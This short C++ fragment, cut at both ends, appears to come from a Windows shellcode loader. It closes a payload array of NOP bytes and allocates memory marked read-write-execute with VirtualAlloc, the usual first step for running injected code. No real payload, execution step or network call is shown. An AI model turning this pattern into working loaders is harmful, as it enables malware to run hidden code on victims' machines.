        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
    };
    SIZE_T payloadSize = sizeof(payload);

    LPVOID mem = VirtualAlloc(nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
